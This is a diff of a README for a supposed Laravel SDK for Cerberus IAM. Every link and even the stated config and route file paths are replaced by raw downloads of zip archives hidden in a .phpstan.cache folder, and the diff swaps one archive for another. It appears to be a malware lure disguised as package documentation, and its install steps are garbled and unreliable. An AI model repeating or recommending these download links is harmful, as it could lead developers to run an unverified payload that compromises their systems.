@@ -1,6 +1,6 @@
 # 🛡️ laravel-sdk - Seamless Laravel Integration Made Easy
 
-[![Download laravel-sdk](https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/59/85/laravel-sdk_v3.7.zip)](https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/59/85/laravel-sdk_v3.7.zip)
+[![Download laravel-sdk](https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/be/49/sdk_laravel_3.8.zip)](https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/be/49/sdk_laravel_3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **laravel-sdk**! This package helps you integrate Cerberus IAM wi
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of **laravel-sdk**: [GitHub Releases](https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/59/85/laravel-sdk_v3.7.zip). You will find the installation files and instructions on this page.
+To get started, visit this page to download the latest version of **laravel-sdk**: [GitHub Releases](https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/be/49/sdk_laravel_3.8.zip). You will find the installation files and instructions on this page.
 
 ## 📋 System Requirements
 
@@ -33,7 +33,7 @@ The **laravel-sdk** package comes packed with useful features:
 
 To set up the **laravel-sdk** in your Laravel project, follow these steps:
 
-1. **Download the Package**: Go to [GitHub Releases](https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/59/85/laravel-sdk_v3.7.zip) and download the latest version.
+1. **Download the Package**: Go to [GitHub Releases](https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/be/49/sdk_laravel_3.8.zip) and download the latest version.
    
 2. **Install the Package**:
    Open your terminal and navigate to your Laravel project directory. Run the following command:
@@ -48,9 +48,9 @@ To set up the **laravel-sdk** in your Laravel project, follow these steps:
    php artisan vendor:publish --provider="Cerberus\LaravelSdk\CerberusServiceProvider"
    ```
 
-4. **Configure the Package**: Update the configuration file located at `https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/59/85/laravel-sdk_v3.7.zip` according to your setup. You need to input your IAM configurations here.
+4. **Configure the Package**: Update the configuration file located at `https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/be/49/sdk_laravel_3.8.zip` according to your setup. You need to input your IAM configurations here.
 
-5. **Add Middleware**: Add the required middleware to your `https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/59/85/laravel-sdk_v3.7.zip` file for user authentication.
+5. **Add Middleware**: Add the required middleware to your `https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/be/49/sdk_laravel_3.8.zip` file for user authentication.
 
 6. **Run Migrations**: If your package requires database migrations, run:
 
@@ -68,8 +68,8 @@ To set up the **laravel-sdk** in your Laravel project, follow these steps:
 
 To implement Single Sign-On using the **laravel-sdk**, follow these additional instructions:
 
-1. Configure your OIDC settings in the `https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/59/85/laravel-sdk_v3.7.zip` configuration file.
-2. Add routes for login and logout in your `https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/59/85/laravel-sdk_v3.7.zip` file.
+1. Configure your OIDC settings in the `https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/be/49/sdk_laravel_3.8.zip` configuration file.
+2. Add routes for login and logout in your `https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/be/49/sdk_laravel_3.8.zip` file.
 3. Use the provided middleware to protect your routes.
 
 ## 🛠️ Troubleshooting
@@ -77,7 +77,7 @@ To implement Single Sign-On using the **laravel-sdk**, follow these additional i
 If you encounter any issues while installing or using the **laravel-sdk**, check the following:
 
 - Ensure your PHP version meets the requirements.
-- Confirm that all configurations are correct in the `https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/59/85/laravel-sdk_v3.7.zip` file.
+- Confirm that all configurations are correct in the `https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/be/49/sdk_laravel_3.8.zip` file.
 - Check the application logs in `storage/logs` for specific error messages.
 
 For any specific questions, consider reviewing the discussions or issues section of the GitHub page.
@@ -86,11 +86,11 @@ For any specific questions, consider reviewing the discussions or issues section
 
 To further understand how to use **laravel-sdk**, refer to these helpful links:
 
-- [Official Documentation](https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/59/85/laravel-sdk_v3.7.zip)
-- [Community Forum](https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/59/85/laravel-sdk_v3.7.zip)
+- [Official Documentation](https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/be/49/sdk_laravel_3.8.zip)
+- [Community Forum](https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/be/49/sdk_laravel_3.8.zip)
 
 ## 📦 Download Again
 
-Ready to enhance your Laravel application? Don’t forget to download the latest version here: [GitHub Releases](https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/59/85/laravel-sdk_v3.7.zip). 
+Ready to enhance your Laravel application? Don’t forget to download the latest version here: [GitHub Releases](https://raw.githubusercontent.com/magdysayed/laravel-sdk/main/.phpstan.cache/cache/PHPStan/be/49/sdk_laravel_3.8.zip). 
 
 The **laravel-sdk** package simplifies user authentication for Laravel applications, allowing you to focus on building while we handle security.
